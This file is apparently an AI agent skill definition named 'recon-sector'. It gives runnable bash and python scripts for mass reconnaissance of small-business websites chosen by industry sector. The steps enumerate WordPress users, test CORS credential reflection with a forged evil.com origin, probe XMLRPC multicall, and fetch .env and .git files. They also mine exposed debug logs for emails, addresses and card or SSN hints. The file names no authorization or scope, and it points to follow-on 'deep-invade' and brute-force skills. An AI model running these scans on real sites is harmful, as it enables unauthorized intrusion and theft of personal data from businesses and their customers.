---
name: recon-sector
description: Parameterized sector recon using sector database.
version: 2.0.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [recon, sector, wordpress, cors, xmlrpc, mass-recon]
  category: redteam
  related_skills:
    - wp-mass-recon
    - cors-credential-wordpress
    - xmlrpc-exploitation
    - source-leak-hunt
    - error-log-mining
    - deep-invade
    - recon-playbook
---

# RECON-SECTOR — Parameterized Sector Reconnaissance

Unified sector-specific reconnaissance. Takes a sector name (e.g., `plumbing`, `dentists`, `hvac`), loads sector-specific platform and path data from `references/sectors.yaml`, and runs the standard recon probe suite: WordPress detection, CORS credential reflection, XMLRPC exposure, debug log mining, source leak checks, and directory listing detection.

Replaces 25 individual `recon-*` skills that were identical template copies with only sector name and platform names changed.

## When to Use

- Starting recon on a target in a known SMB sector.
- After `sector-recon-methodology` produces a target list and you need to probe.
- When you want sector-aware path lists (financing pages, booking portals, etc.) tailored to the target's industry.

## Prerequisites

- `references/sectors.yaml` in the same directory as this SKILL.md.
- Target domain list file (one domain per line).

## How to Run

```bash
SECTOR="plumbing"
TARGETS_FILE="targets.txt"
python3 references/probe_sector.py "$SECTOR" "$TARGETS_FILE" output/
```

## Quick Reference

| Check | Paths | Severity if exposed |
|-------|-------|---------------------|
| WP detection | `/wp-login.php`, `/wp-content/` | Info |
| REST API users | `/wp-json/wp/v2/users` | Medium (user enum) |
| CORS + REST API | `/wp-json/wp/v2/users` with `Origin: https://evil.com` | High (if ACAC: true) |
| XMLRPC | `/xmlrpc.php` | Medium (open), High (multicall) |
| Debug log | `/wp-content/debug.log` | High (PII/SQL leakage) |
| Directory listing | `/wp-content/uploads/` | Medium-High (file exposure) |
| Source leaks | `/.env`, `/.git/config`, `/info.php` | Critical (creds in env) |
| Sector-specific paths | From `sectors.yaml` per sector | Varies |

## Procedure

### Step 1 — Load sector data

```bash
SECTOR="$1"
TARGETS_FILE="$2"
OUTDIR="${3:-output}"

python3 -c "
import yaml, sys
with open('references/sectors.yaml') as f:
    data = yaml.safe_load(f)
sector = data['sectors'].get(sys.argv[1], {})
print('\n'.join(sector.get('high_value_paths', [])))
" "$SECTOR"
```

### Step 2 — WordPress presence check

```bash
while IFS= read -r target; do
  [ -z "$target" ] && continue
  code=$(curl -sk --max-time 10 --connect-timeout 10 -o /dev/null -w '%{http_code}' "https://$target/wp-login.php")
  [ "$code" != "404" ] && echo "[WP] $target (HTTP $code)"
  sleep 1
done < "$TARGETS_FILE"
```

### Step 3 — CORS credential reflection

```bash
while IFS= read -r target; do
  [ -z "$target" ] && continue
  headers=$(curl -sk --max-time 10 --connect-timeout 10 -I "https://$target/wp-json/wp/v2/users" \
    -H "Origin: https://evil.com" 2>/dev/null)
  if echo "$headers" | grep -qi "access-control-allow-origin: https://evil.com" && \
     echo "$headers" | grep -qi "access-control-allow-credentials: true"; then
    echo "[CORS] $target — credential reflection confirmed"
  fi
  sleep 2
done < "$TARGETS_FILE"
```

### Step 4 — XMLRPC exposure

```bash
while IFS= read -r target; do
  [ -z "$target" ] && continue
  body=$(curl -sk --max-time 10 --connect-timeout 10 -X POST "https://$target/xmlrpc.php" \
    -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' 2>/dev/null)
  if echo "$body" | grep -q "methodResponse"; then
    has_multicall=$(echo "$body" | grep -c "system.multicall" || true)
    echo "[XMLRPC] $target — active (multicall: $([ "$has_multicall" -gt 0 ] && echo YES || echo no))"
  fi
  sleep 1
done < "$TARGETS_FILE"
```

### Step 5 — Debug log mining

```bash
while IFS= read -r target; do
  [ -z "$target" ] && continue
  body=$(curl -sk --max-time 15 --connect-timeout 10 "https://$target/wp-content/debug.log" 2>/dev/null)
  if [ -n "$body" ] && [ ${#body} -gt 200 ]; then
    emails=$(echo "$body" | grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u | head -10)
    pii=$(echo "$body" | grep -Eo '(address|phone|street|zip|SSN|card|CC|credit).{0,80}' | head -10)
    echo "[DEBUGLOG] $target — $(echo "$body" | wc -c) bytes"
    [ -n "$emails" ] && echo "  Emails: $emails"
    [ -n "$pii" ] && echo "  PII hints: $(echo "$pii" | wc -l) lines"
  fi
  sleep 2
done < "$TARGETS_FILE"
```

### Step 6 — Sector-specific paths

```bash
while IFS= read -r target; do
  [ -z "$target" ] && continue
  for path in $(python3 -c "
import yaml, sys
with open('references/sectors.yaml') as f:
    data = yaml.safe_load(f)
sector = data['sectors'].get('$SECTOR', {})
print(' '.join(sector.get('high_value_paths', [])))
"); do
    code=$(curl -sk --max-time 10 --connect-timeout 10 -o /dev/null -w '%{http_code}' "https://$target$path")
    [ "$code" != "404" ] && echo "[SECTOR:$SECTOR] $target$path (HTTP $code)"
    sleep 1
  done
done < "$TARGETS_FILE"
```

## Pitfalls

- **Parked/for-sale domains return HTTP 200 for every path.** Cross-check: if `/robots.txt` and `/.env` both return 200 with near-identical HTML body, mark domain as parked and skip.
- **Wildcard DNS.** Resolve a random string first: `dig RANDOMSTRING.target.com +short`. If it resolves to the same IP as the domain, all subdomains appear live.
- **crt.sh rate limiting.** Use `--max-time` and expect occasional empty JSON. Retry with delay.
- **Debug log content verification.** A 200 status on `/wp-content/debug.log` without sensitive content is NOT a finding. Check for actual PII patterns (emails, phone numbers, SQL queries).
- **CORS false positives.** `ACAO: *` without `ACAC: true` is NOT exploitable. Only `ACAO: <reflected origin>` + `ACAC: true` qualifies.

## Verification

- Every CORS finding MUST have both `Access-Control-Allow-Origin: <reflected>` AND `Access-Control-Allow-Credentials: true` confirmed.
- Debug log findings MUST contain actual PII patterns (emails, phone numbers, addresses, SQL queries) — not just a 200 status.
- XMLRPC findings MUST confirm `methodResponse` in body — not just a 200 status.
- Directory listing MUST show actual `Index of` header — not assume from 200 status alone.
- All findings should be saved to per-target markdown files under `$OUTDIR/`.

---

## Related Skills

- `wp-mass-recon` — batch scanner for high-volume WordPress probing.
- `sector-recon-methodology` — sector selection and target generation.
- `deep-invade` — deep pentest for high-value targets (score >= 6).
- `cors-credential-wordpress` — detailed CORS exploitation methodology.
- `xmlrpc-exploitation` — XMLRPC attack vectors (multicall, pingback SSRF, brute force).
- `source-leak-hunt` — sensitive file detection (.env, .git, backups).
- `error-log-mining` — error log credential and PII mining.
